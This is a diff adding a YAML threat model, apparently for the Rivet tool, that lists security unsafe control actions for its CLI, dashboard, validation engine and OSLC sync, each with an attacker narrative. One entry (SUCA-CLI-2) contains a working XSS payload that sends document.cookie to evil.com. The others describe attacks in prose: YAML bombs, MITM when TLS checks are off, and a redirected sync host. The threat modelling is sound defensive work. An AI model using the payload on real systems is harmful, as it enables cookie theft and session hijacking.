@@ -1,0 +1,202 @@
+# =============================================================================
+# STPA-Sec Step 3 — Security Unsafe Control Actions
+# =============================================================================
+#
+# Security UCAs identify control actions that, in adversarial contexts, lead
+# to security hazards.  Each UCA includes an 'adversarial-causation' field
+# explaining how an attacker could introduce or exploit the unsafe condition.
+#
+# The four UCA types (provably complete):
+#   1. not-providing  — controller does NOT provide the control action
+#   2. providing      — controller DOES provide the control action
+#   3. too-early-too-late — timing or order is wrong
+#   4. stopped-too-soon — action applied for insufficient duration
+#
+# Controller IDs reference the control structure in safety/stpa/control-structure.yaml.
+#
+# Reference: STPA Handbook, §2.4 + security extension
+# =============================================================================
+
+artifacts:
+  # ── CTRL-CLI (CLI controller) ────────────────────────────────────────────
+
+  - id: SUCA-CLI-1
+    type: sec-uca
+    title: CLI does not validate artifact source provenance before import
+    status: approved
+    description: >
+      The CLI's 'rivet import' / 'rivet sync' commands do not provide a
+      source provenance check in contexts where the source URL or path has
+      changed since the last import.
+    links:
+      - type: issued-by
+        target: CTRL-CLI
+      - type: leads-to-sec-hazard
+        target: SH-1
+    fields:
+      uca-type: not-providing
+      context: >
+        Operator runs 'rivet sync' after an attacker has modified rivet.yaml
+        to point to an adversary-controlled OSLC endpoint or git remote.
+      adversarial-causation: >
+        Supply-chain attacker modifies rivet.yaml in the repository, changing
+        the OSLC server URL to an attacker-controlled host.  On next sync, the
+        CLI imports adversary-crafted artifacts without provenance verification.
+      attacker-type: supply-chain
+
+  - id: SUCA-CLI-2
+    type: sec-uca
+    title: CLI provides HTML export without sanitizing artifact content
+    status: approved
+    description: >
+      The CLI's 'rivet export' command provides HTML output that includes
+      un-sanitized artifact description content when rendering to HTML.
+    links:
+      - type: issued-by
+        target: CTRL-CLI
+      - type: leads-to-sec-hazard
+        target: SH-4
+    fields:
+      uca-type: providing
+      context: >
+        Artifact YAML file contains a description field with embedded
+        HTML/script content injected by an insider or supply-chain attacker.
+      adversarial-causation: >
+        Insider or supply-chain attacker writes a YAML artifact with
+        description: '<script>fetch("https://evil.com?d="+document.cookie)</script>'.
+        CLI export includes this verbatim in the HTML output, triggering XSS
+        in any browser that opens the export.
+      attacker-type: insider
+
+  # ── CTRL-DASH (dashboard controller) ────────────────────────────────────
+
+  - id: SUCA-DASH-1
+    type: sec-uca
+    title: Dashboard provides artifact content to unauthenticated network requests
+    status: approved
+    description: >
+      When the dashboard is bound to a non-localhost address (e.g., 0.0.0.0),
+      it provides full artifact content to any client that connects, without
+      requiring authentication.
+    links:
+      - type: issued-by
+        target: CTRL-DASH
+      - type: leads-to-sec-hazard
+        target: SH-3
+    fields:
+      uca-type: providing
+      context: >
+        An operator starts 'rivet serve --bind 0.0.0.0:3000' (or the default
+        binds to all interfaces) in a CI/CD environment accessible to external
+        network actors.
+      adversarial-causation: >
+        External network attacker probes for open ports on CI runners or
+        developer machines.  The dashboard responds with full artifact JSON
+        including proprietary requirements and safety analyses.
+      attacker-type: external-network
+
+  - id: SUCA-DASH-2
+    type: sec-uca
+    title: Dashboard provides un-escaped artifact content in HTML responses
+    status: approved
+    description: >
+      The dashboard's HTML rendering pipeline provides artifact field content
+      (title, description, document body) directly into HTML templates without
+      escaping HTML entities.
+    links:
+      - type: issued-by
+        target: CTRL-DASH
+      - type: leads-to-sec-hazard
+        target: SH-4
+    fields:
+      uca-type: providing
+      context: >
+        A crafted artifact with HTML in its description is stored in the YAML
+        store.  Any user who navigates to that artifact in the dashboard
+        triggers script execution.
+      adversarial-causation: >
+        Insider or supply-chain attacker commits a YAML artifact with an
+        embedded XSS payload.  The dashboard renders it without escaping,
+        so the attacker's script executes in every reviewer's browser —
+        potentially exfiltrating session state or injecting false data.
+      attacker-type: insider
+
+  # ── CTRL-CORE (validation engine) ───────────────────────────────────────
+
+  - id: SUCA-CORE-1
+    type: sec-uca
+    title: Validation engine does not enforce limits on YAML input size or depth
+    status: approved
+    description: >
+      The core validation engine does not provide size or depth limits when
+      parsing YAML artifact files, accepting arbitrarily large or deep inputs.
+    links:
+      - type: issued-by
+        target: CTRL-CORE
+      - type: leads-to-sec-hazard
+        target: SH-6
+    fields:
+      uca-type: not-providing
+      context: >
+        A CI pipeline runs 'rivet validate' on a pull request that introduces
+        a YAML artifact with deeply nested anchors or a very large description.
+      adversarial-causation: >
+        Supply-chain attacker submits a pull request that adds a crafted YAML
+        file with exponential anchor expansion (YAML bomb) or a 100 MB
+        description string.  The CI runner exhausts memory, denying the
+        pipeline to legitimate work.
+      attacker-type: supply-chain
+
+  # ── CTRL-OSLC (OSLC sync controller) ────────────────────────────────────
+
+  - id: SUCA-OSLC-1
+    type: sec-uca
+    title: OSLC sync controller does not validate server URL against an allowlist
+    status: approved
+    description: >
+      The OSLC sync controller provides sync operations to any URL specified
+      in rivet.yaml without checking it against an operator-defined allowlist.
+    links:
+      - type: issued-by
+        target: CTRL-OSLC
+      - type: leads-to-sec-hazard
+        target: SH-5
+    fields:
+      uca-type: providing
+      context: >
+        rivet.yaml has been modified (by insider or supply-chain compromise)
+        to point to an adversary-controlled OSLC host.  The sync controller
+        connects and exchanges artifact data.
+      adversarial-causation: >
+        Supply-chain attacker modifies rivet.yaml in a pull request to change
+        the OSLC server URL.  On merge and next sync, Rivet sends engineering
+        artifacts to the attacker's server and accepts adversary-injected
+        artifacts as authoritative.
+      attacker-type: supply-chain
+
+  - id: SUCA-OSLC-2
+    type: sec-uca
+    title: OSLC sync does not verify TLS certificate authenticity
+    status: approved
+    description: >
+      The OSLC HTTP client provides sync requests to remote servers without
+      enforcing certificate validation (or with validation disabled by
+      configuration), allowing MITM interception.
+    links:
+      - type: issued-by
+        target: CTRL-OSLC
+      - type: leads-to-sec-hazard
+        target: SH-1
+      - type: leads-to-sec-hazard
+        target: SH-3
+    fields:
+      uca-type: providing
+      context: >
+        Operator has set tls-verify: false in rivet.yaml for a development
+        environment and this setting is inadvertently carried into production.
+        An adversary on the same network performs a MITM attack.
+      adversarial-causation: >
+        Adjacent network attacker intercepts TLS handshake and presents a
+        self-signed certificate.  With certificate validation disabled, Rivet
+        connects, disclosing artifact payloads and accepting injected responses.
+      attacker-type: external-network
